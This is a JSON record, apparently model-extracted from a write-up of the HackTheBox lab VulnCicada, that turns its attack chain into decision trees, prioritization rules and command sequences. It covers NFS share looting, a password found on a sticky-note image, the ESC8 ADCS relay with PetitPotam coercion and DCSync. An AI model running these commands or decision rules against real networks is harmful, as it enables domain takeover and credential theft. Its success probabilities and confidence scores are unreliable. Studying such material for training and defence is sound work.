@@ -1,0 +1,985 @@
+{
+  "writeup_id": "Htb_Vulncicada",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_domain_controller_esc8_nfs_exfil",
+    "primary_services": [
+      "nfs",
+      "dns",
+      "kerberos",
+      "ldap",
+      "smb",
+      "adcs"
+    ],
+    "port_signature": "53+88+111+389+445+2049",
+    "service_combination": "nfs+dns+kerberos+ldap+smb+adcs",
+    "os_family": "windows_server",
+    "environment_type": "active_directory",
+    "entry_vector": "nfs_share_credential_exfil",
+    "privilege_path": "domain_user_to_domain_admin",
+    "attack_complexity": "medium",
+    "estimated_time": "90-120 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "nfs_share_on_domain_controller",
+      "esc8_vulnerability",
+      "petitpotam_coercion",
+      "certipy_relay_attack"
+    ],
+    "environmental_clues": [
+      "domain_controller_role",
+      "adcs_certificate_services",
+      "nfs_service_on_windows",
+      "dns_manipulation_possible"
+    ],
+    "similar_scenarios": [
+      "escape_htb_medium",
+      "authority_htb_medium"
+    ],
+    "unique_aspects": [
+      "nfs_on_windows_dc",
+      "image_exfiltration_with_credentials",
+      "esc8_from_linux",
+      "malicious_dns_record_creation"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "NFS_Share_Enumeration",
+        "success_reason": "Open NFS share containing sensitive files with credentials",
+        "prerequisite_indicators": [
+          "nfs_service_running",
+          "mountd_accessible",
+          "no_authentication_required"
+        ],
+        "recognition_patterns": [
+          "port 2049 open",
+          "rpcinfo shows NFS services",
+          "showmount reveals accessible shares"
+        ],
+        "failure_modes": [
+          "nfs_shares_properly_secured",
+          "no_sensitive_files_exposed",
+          "authentication_required"
+        ],
+        "environmental_factors": [
+          "mixed_windows_linux_environment",
+          "legacy_file_sharing_configs",
+          "insufficient_access_controls"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "ADCS_ESC8_Attack",
+        "success_reason": "Domain Controller vulnerable to ESC8 with HTTP enrollment enabled",
+        "prerequisite_indicators": [
+          "adcs_installed",
+          "http_enrollment_enabled",
+          "ntlm_relay_possible",
+          "dns_manipulation_allowed"
+        ],
+        "recognition_patterns": [
+          "certipy shows ESC8 vulnerability",
+          "HTTP enrollment endpoints accessible",
+          "machine account can modify DNS"
+        ],
+        "failure_modes": [
+          "https_only_enrollment",
+          "ntlm_relay_protections",
+          "dns_modification_blocked"
+        ],
+        "environmental_factors": [
+          "default_adcs_configuration",
+          "legacy_http_enrollment",
+          "insufficient_dns_security"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "30-45 minutes"
+      },
+      {
+        "technique": "PetitPotam_Coercion",
+        "success_reason": "Domain Controller responds to authentication coercion attacks",
+        "prerequisite_indicators": [
+          "rpc_accessible",
+          "machine_account_available",
+          "ntlm_relay_target_ready"
+        ],
+        "recognition_patterns": [
+          "RPC endpoints accessible",
+          "MS-EFSRPC available",
+          "authentication coercion successful"
+        ],
+        "failure_modes": [
+          "rpc_endpoints_blocked",
+          "coercion_protections_enabled",
+          "authentication_filtering"
+        ],
+        "environmental_factors": [
+          "unpatched_windows_server",
+          "default_rpc_configuration",
+          "no_coercion_protections"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "15-25 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "NFS share with credential images",
+        "discovery_method": "showmount and NFS enumeration",
+        "why_critical": "Contains password on sticky note in image files",
+        "how_to_recognize": [
+          "NFS service running on Windows DC",
+          "accessible shares without authentication",
+          "image files in shared directories"
+        ],
+        "follow_up_actions": [
+          "mount_nfs_shares",
+          "extract_all_files",
+          "analyze_images_for_credentials"
+        ]
+      },
+      {
+        "discovery": "ADCS ESC8 vulnerability",
+        "discovery_method": "certipy find enumeration",
+        "why_critical": "Allows machine account compromise via NTLM relay",
+        "how_to_recognize": [
+          "HTTP enrollment enabled",
+          "ESC8 flagged by certipy",
+          "NTLM authentication accepted"
+        ],
+        "follow_up_actions": [
+          "setup_dns_poisoning",
+          "configure_ntlm_relay",
+          "coerce_authentication"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "domain_user",
+        "escalation_method": "ESC8_to_machine_account",
+        "why_possible": "ADCS HTTP enrollment vulnerable to NTLM relay attacks",
+        "recognition_signs": [
+          "adcs_http_enrollment_enabled",
+          "ntlm_authentication_accepted",
+          "dns_modification_possible"
+        ],
+        "exploitation_path": "DNS Poisoning → PetitPotam → NTLM Relay → Machine Account TGT → DCSync"
+      },
+      {
+        "privilege_level": "machine_account",
+        "escalation_method": "DCSync_attack",
+        "why_possible": "Machine accounts have replication privileges by default",
+        "recognition_signs": [
+          "machine_account_tgt_obtained",
+          "domain_controller_accessible",
+          "replication_rights_available"
+        ],
+        "exploitation_path": "Machine Account → DCSync → Domain Admin Hashes → Administrator Shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 53,88,389,445,2049 open on Windows host with NFS",
+        "decision": "Identify as Domain Controller and check NFS share first for credential discovery",
+        "reasoning": "NFS share on Windows DC is unusual and may contain sensitive data, easier than Kerberos attacks",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "kerberos_attacks",
+            "when": "if nfs_enumeration_fails"
+          },
+          {
+            "option": "smb_enumeration",
+            "when": "if_credentials_found"
+          },
+          {
+            "option": "ldap_enumeration",
+            "when": "if anonymous access"
+          }
+        ],
+        "success_indicators": [
+          "nfs_share_accessible",
+          "user_profiles_found",
+          "sensitive_files_discovered"
+        ],
+        "next_decision": "enumerate_nfs_for_credentials"
+      },
+      {
+        "step": 2,
+        "situation": "NFS share contains user profiles with potential credential artifacts",
+        "decision": "Search for credential artifacts in user directories (images, documents, sticky notes)",
+        "reasoning": "User profiles often contain passwords in images, documents, or application data",
+        "confidence": 0.85,
+        "prerequisites": [
+          "nfs_share_mounted",
+          "user_directories_accessible"
+        ],
+        "success_indicators": [
+          "images_with_passwords",
+          "documents_with_creds",
+          "application_data_found"
+        ],
+        "failure_fallbacks": [
+          "asreproast",
+          "kerberoasting",
+          "password_spraying"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Found domain credentials from NFS share artifacts",
+        "decision": "Authenticate to domain and enumerate ADCS for certificate-based attacks",
+        "reasoning": "Modern AD environments often have ADCS vulnerabilities, especially ESC attacks",
+        "confidence": 0.8,
+        "prerequisites": [
+          "valid_domain_credentials"
+        ],
+        "success_indicators": [
+          "adcs_templates_found",
+          "vulnerable_templates_identified"
+        ],
+        "next_decision": "identify_adcs_vulnerability"
+      },
+      {
+        "step": 4,
+        "situation": "ADCS environment with potential ESC8 vulnerability",
+        "decision": "Test for ESC8 (NTLM relay to ADCS) vulnerability",
+        "reasoning": "ESC8 allows privilege escalation to domain admin via certificate relay attacks",
+        "confidence": 0.75,
+        "prerequisites": [
+          "adcs_accessible",
+          "domain_credentials"
+        ],
+        "success_indicators": [
+          "esc8_vulnerability_confirmed",
+          "certificate_authority_accessible"
+        ],
+        "next_decision": "execute_esc8_attack"
+      }
+    ],
+    "branching_logic": {
+      "if_nfs_credentials_found": {
+        "action": "authenticate_and_enumerate_adcs",
+        "tools": [
+          "certipy",
+          "bloodhound-python",
+          "netexec"
+        ],
+        "next_phase": "adcs_vulnerability_assessment"
+      },
+      "if_nfs_enumeration_fails": {
+        "action": "try_kerberos_attacks",
+        "alternatives": [
+          "asreproast",
+          "kerberoasting",
+          "password_spraying"
+        ],
+        "decision_criteria": "based_on_anonymous_access_level"
+      },
+      "if_esc8_vulnerable": {
+        "action": "setup_relay_attack",
+        "tools": [
+          "certipy",
+          "petitpotam",
+          "dns_manipulation"
+        ],
+        "purpose": "coerce_dc_authentication_for_certificate_theft"
+      },
+      "if_machine_certificate_obtained": {
+        "action": "dump_domain_hashes",
+        "tools": [
+          "secretsdump",
+          "netexec"
+        ],
+        "next_phase": "domain_admin_access"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_nfs_shares_on_windows_first",
+        "reasoning": "unusual_service_often_contains_sensitive_data_with_weak_permissions",
+        "applicability": "windows_hosts_with_nfs_service"
+      },
+      {
+        "rule": "enumerate_adcs_after_any_domain_credentials",
+        "reasoning": "certificate_services_frequently_misconfigured_for_privilege_escalation",
+        "applicability": "active_directory_with_certificate_services"
+      },
+      {
+        "rule": "prioritize_esc8_over_other_esc_attacks",
+        "reasoning": "esc8_provides_direct_path_to_domain_admin_via_machine_account_compromise",
+        "applicability": "adcs_environment_with_ntlm_relay_possible"
+      },
+      {
+        "rule": "search_user_profiles_for_credential_artifacts",
+        "reasoning": "users_frequently_store_passwords_in_images_documents_and_notes",
+        "applicability": "access_to_user_profile_directories"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "NFS_Share_Enumeration",
+        "mitre_id": "T1135",
+        "required_services": [
+          "nfs",
+          "rpcbind",
+          "mountd"
+        ],
+        "required_ports": [
+          111,
+          2049
+        ],
+        "os_requirements": [
+          "linux",
+          "unix",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "nfs_service_running",
+          "rpcbind_accessible",
+          "mountd_accessible"
+        ],
+        "success_indicators": [
+          "showmount_returns_exports",
+          "mount_succeeds",
+          "readable_files_present"
+        ],
+        "incompatible_with": [
+          "nfs_disabled",
+          "strict_export_restrictions",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "anonymous_mount_allowed",
+          "world_readable_exports",
+          "sensitive_files_in_share"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "ADCS_ESC8_Attack",
+        "mitre_id": "T1649",
+        "required_services": [
+          "adcs",
+          "dns",
+          "ldap"
+        ],
+        "required_ports": [
+          53,
+          389,
+          636
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "active_directory_certificate_services",
+          "web_enrollment_enabled",
+          "ntlm_relay_possible",
+          "dns_modification_allowed"
+        ],
+        "success_indicators": [
+          "certificate_authority_detected",
+          "web_enrollment_accessible",
+          "dns_record_creation_succeeds"
+        ],
+        "incompatible_with": [
+          "adcs_disabled",
+          "ntlm_relay_mitigations",
+          "dns_secure_updates_only"
+        ],
+        "confidence_boosters": [
+          "default_adcs_configuration",
+          "legacy_certificate_templates",
+          "weak_enrollment_permissions"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-30 minutes"
+      },
+      {
+        "technique": "PetitPotam_Coercion",
+        "mitre_id": "T1187",
+        "required_services": [
+          "rpc",
+          "lsarpc"
+        ],
+        "required_ports": [
+          135,
+          445
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "domain_controller_accessible",
+          "rpc_services_enabled",
+          "authentication_coercion_possible"
+        ],
+        "success_indicators": [
+          "rpc_connection_established",
+          "authentication_request_triggered",
+          "ntlm_challenge_received"
+        ],
+        "incompatible_with": [
+          "rpc_disabled",
+          "coercion_mitigations_enabled",
+          "network_segmentation"
+        ],
+        "confidence_boosters": [
+          "unpatched_domain_controller",
+          "default_rpc_configuration",
+          "legacy_windows_version"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "Domain_Hash_Dumping",
+        "mitre_id": "T1003.003",
+        "required_services": [
+          "ldap",
+          "smb"
+        ],
+        "required_ports": [
+          389,
+          445
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "domain_admin_privileges",
+          "domain_controller_access",
+          "ntds_dit_accessible"
+        ],
+        "success_indicators": [
+          "dcsync_rights_confirmed",
+          "ntds_dit_readable",
+          "hash_extraction_succeeds"
+        ],
+        "incompatible_with": [
+          "insufficient_privileges",
+          "ntds_dit_protected",
+          "advanced_threat_protection"
+        ],
+        "confidence_boosters": [
+          "machine_account_privileges",
+          "replication_rights_granted",
+          "legacy_ad_configuration"
+        ],
+        "typical_success_rate": 0.9,
+        "estimated_time": "3-8 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "active_directory": {
+        "port_indicators": [
+          53,
+          88,
+          389,
+          445,
+          3268,
+          636,
+          3269,
+          9389
+        ],
+        "service_indicators": [
+          "kerberos",
+          "ldap",
+          "smb",
+          "dns",
+          "adws"
+        ],
+        "banner_indicators": [
+          "Active Directory",
+          "Windows Server",
+          "Domain Controller"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "nfs_environment": {
+        "port_indicators": [
+          111,
+          2049
+        ],
+        "service_indicators": [
+          "rpcbind",
+          "nfs",
+          "mountd"
+        ],
+        "banner_indicators": [
+          "RPC",
+          "NFS"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "adcs_environment": {
+        "port_indicators": [
+          80,
+          443,
+          389,
+          636
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "ldap"
+        ],
+        "banner_indicators": [
+          "Certificate Services",
+          "ADCS"
+        ],
+        "confidence_threshold": 0.75
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "IIS",
+          "Microsoft-IIS"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "nfs_share_enumeration",
+          "when": "nfs_service_detected",
+          "reason": "often_contains_sensitive_files_no_auth_required"
+        },
+        {
+          "attack": "adcs_esc8_attack",
+          "when": "active_directory_and_adcs_detected",
+          "reason": "high_impact_domain_compromise_possible"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "petitpotam_coercion",
+          "when": "domain_controller_detected",
+          "reason": "enables_ntlm_relay_attacks"
+        },
+        {
+          "attack": "smb_anonymous_enumeration",
+          "when": "smb_service_detected",
+          "reason": "may_reveal_usernames_and_shares"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "web_directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "default_iis_page_suggests_minimal_content"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "NFS Share Enumeration",
+        "mitre_id": "T1135",
+        "category": "discovery",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "showmount",
+            "command_template": "showmount -e {target_ip}",
+            "actual_command": "showmount -e 10.129.234.48",
+            "output_pattern": "Export list for {ip}:",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "mount",
+            "command_template": "sudo mount -t nfs -o rw {target_ip}:{share_path} {local_mount_point}",
+            "actual_command": "sudo mount -t nfs -o rw 10.129.234.48:/profiles /mnt",
+            "success_factors": [
+              "public_nfs_share",
+              "world_readable_permissions"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "nfs_service_accessible",
+          "public_shares_available"
+        ],
+        "success_indicators": [
+          "share_mounted_successfully",
+          "files_accessible_for_reading",
+          "sensitive_data_discovered"
+        ],
+        "common_failures": [
+          "permission_denied_on_mount",
+          "no_public_shares_available",
+          "empty_shares"
+        ],
+        "follow_up_techniques": [
+          "credential_harvesting_from_files",
+          "user_enumeration",
+          "privilege_escalation"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Credential Harvesting from Images",
+        "mitre_id": "T1552.001",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "find",
+            "command_template": "find {mount_point} -type f -ls",
+            "actual_command": "find /mnt -type f -ls",
+            "output_pattern": "file listings with permissions",
+            "effectiveness_rating": 4,
+            "reliability": 0.95
+          },
+          {
+            "name": "cp",
+            "command_template": "cp {source_file} {destination}",
+            "actual_command": "cp /mnt/Administrator/vacation.png .",
+            "success_factors": [
+              "readable_permissions",
+              "sensitive_files_present"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "mounted_file_share",
+          "readable_files_available",
+          "credentials_stored_in_images"
+        ],
+        "success_indicators": [
+          "images_copied_successfully",
+          "password_visible_on_sticky_note",
+          "credentials_extracted_from_visual_inspection"
+        ],
+        "common_failures": [
+          "permission_denied_on_files",
+          "no_sensitive_data_in_images",
+          "encrypted_or_protected_files"
+        ],
+        "follow_up_techniques": [
+          "kerberos_authentication",
+          "smb_enumeration",
+          "domain_reconnaissance"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Kerberos Authentication",
+        "mitre_id": "T1078.002",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "netexec",
+            "command_template": "netexec smb {target} -u {username} -p {password} -k",
+            "actual_command": "netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k",
+            "output_pattern": "[+] {domain}\\{username}:{password}",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "valid_domain_credentials",
+          "kerberos_service_accessible",
+          "domain_name_known"
+        ],
+        "success_indicators": [
+          "successful_authentication_message",
+          "access_to_domain_resources",
+          "ability_to_enumerate_shares"
+        ],
+        "common_failures": [
+          "invalid_credentials",
+          "account_locked_or_disabled",
+          "kerberos_service_unavailable"
+        ],
+        "follow_up_techniques": [
+          "smb_share_enumeration",
+          "ldap_enumeration",
+          "bloodhound_collection"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "ESC8 ADCS Attack",
+        "mitre_id": "T1649",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "certipy",
+            "command_template": "certipy relay -target {ca_server}",
+            "actual_command": "certipy relay -target DC-JPQ225.cicada.vl",
+            "output_pattern": "Certificate obtained for machine account",
+            "effectiveness_rating": 5,
+            "reliability": 0.85
+          },
+          {
+            "name": "petitpotam",
+            "command_template": "petitpotam.py {attacker_ip} {target_dc}",
+            "actual_command": "petitpotam.py 10.10.14.1 DC-JPQ225.cicada.vl",
+            "success_factors": [
+              "vulnerable_adcs_configuration",
+              "coercion_successful"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "adcs_service_available",
+          "esc8_vulnerability_present",
+          "ability_to_coerce_authentication",
+          "dns_manipulation_capability"
+        ],
+        "success_indicators": [
+          "machine_account_certificate_obtained",
+          "tgt_acquired_for_machine_account",
+          "domain_admin_privileges_achieved"
+        ],
+        "common_failures": [
+          "adcs_not_vulnerable_to_esc8",
+          "coercion_blocked_by_security_controls",
+          "dns_manipulation_prevented"
+        ],
+        "follow_up_techniques": [
+          "dcsync_attack",
+          "hash_dumping",
+          "golden_ticket_creation"
+        ],
+        "time_investment": "30-60 minutes",
+        "skill_level": "advanced"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "netexec",
+        "use_case": "domain_authentication_and_enumeration",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "active_directory_environments"
+        ],
+        "alternatives": [
+          "smbclient",
+          "rpcclient",
+          "ldapsearch"
+        ],
+        "best_practices": [
+          "use_kerberos_when_ntlm_disabled",
+          "enumerate_shares_after_authentication",
+          "generate_hosts_file_for_proper_resolution"
+        ]
+      },
+      {
+        "tool": "certipy",
+        "use_case": "adcs_exploitation_and_certificate_attacks",
+        "effectiveness_rating": 5,
+        "reliability": 0.9,
+        "learning_curve": "high",
+        "essential_for": [
+          "adcs_environments"
+        ],
+        "alternatives": [
+          "certify",
+          "manual_certificate_requests"
+        ],
+        "best_practices": [
+          "enumerate_certificate_templates_first",
+          "identify_vulnerable_configurations",
+          "use_relay_attacks_for_esc8"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "nfs_to_domain_credentials",
+        "steps": [
+          {
+            "step": 1,
+            "command": "showmount -e 10.129.234.48",
+            "purpose": "Discover NFS shares",
+            "expected_output": "Export list showing /profiles share"
+          },
+          {
+            "step": 2,
+            "command": "sudo mount -t nfs -o rw 10.129.234.48:/profiles /mnt",
+            "purpose": "Mount NFS share locally",
+            "expected_output": "Share mounted to /mnt"
+          },
+          {
+            "step": 3,
+            "command": "find /mnt -type f -ls",
+            "purpose": "Enumerate files in mounted share",
+            "expected_output": "List of accessible files including images"
+          },
+          {
+            "step": 4,
+            "command": "cp /mnt/Administrator/vacation.png . && sudo cp /mnt/Rosie.Powell/marketing.png .",
+            "purpose": "Extract images for analysis",
+            "expected_output": "Images copied to local directory"
+          },
+          {
+            "step": 5,
+            "command": "netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k",
+            "purpose": "Authenticate with discovered credentials",
+            "expected_output": "Successful Kerberos authentication"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "10-20 minutes"
+      },
+      {
+        "sequence_name": "esc8_privilege_escalation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "certipy find -target DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123",
+            "purpose": "Enumerate ADCS configuration",
+            "expected_output": "Certificate templates and CA information"
+          },
+          {
+            "step": 2,
+            "command": "certipy relay -target DC-JPQ225.cicada.vl",
+            "purpose": "Start certificate relay attack",
+            "expected_output": "Relay server listening for connections"
+          },
+          {
+            "step": 3,
+            "command": "petitpotam.py 10.10.14.1 DC-JPQ225.cicada.vl",
+            "purpose": "Coerce DC authentication to attacker",
+            "expected_output": "Authentication coerced successfully"
+          },
+          {
+            "step": 4,
+            "command": "certipy auth -pfx dc_certificate.pfx",
+            "purpose": "Authenticate with obtained certificate",
+            "expected_output": "TGT obtained for machine account"
+          }
+        ],
+        "success_rate": 0.75,
+        "typical_duration": "45-90 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "VulnCicada",
+      "difficulty": "Medium",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2025-07-03",
+      "author": "xct",
+      "estimated_time": "90-120 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "nfs_enumeration",
+        "adcs_exploitation",
+        "dns_poisoning"
+      ],
+      "key_vulnerabilities": [
+        "esc8_certificate_authority",
+        "nfs_misconfiguration",
+        "petitpotam_coercion"
+      ],
+      "environment_type": "corporate_domain_controller",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "adcs_attacks",
+        "certificate_relay",
+        "dns_manipulation",
+        "coercion_attacks"
+      ],
+      "prerequisite_knowledge": [
+        "active_directory_fundamentals",
+        "certificate_services",
+        "dns_concepts",
+        "relay_attacks"
+      ]
+    },
+    "categorization": {
+      "primary_category": "active_directory",
+      "subcategories": [
+        "certificate_services",
+        "coercion_attacks",
+        "dns_attacks"
+      ],
+      "attack_types": [
+        "credential_access",
+        "privilege_escalation",
+        "lateral_movement"
+      ],
+      "defensive_lessons": [
+        "secure_nfs_configuration",
+        "adcs_hardening",
+        "dns_security",
+        "coercion_protection"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Escape",
+        "Authority",
+        "Manager"
+      ],
+      "similarity_reasons": [
+        "adcs_exploitation",
+        "certificate_attacks",
+        "domain_controller_compromise"
+      ],
+      "unique_aspects": [
+        "esc8_from_linux",
+        "nfs_credential_discovery",
+        "dns_record_manipulation"
+      ],
+      "difficulty_factors": [
+        "complex_attack_chain",
+        "certificate_relay_setup",
+        "linux_based_adcs_attacks"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T14:52:19.296014",
+    "original_file": "0xdf_writeups/Htb Vulncicada.md",
+    "content_length": 44818,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
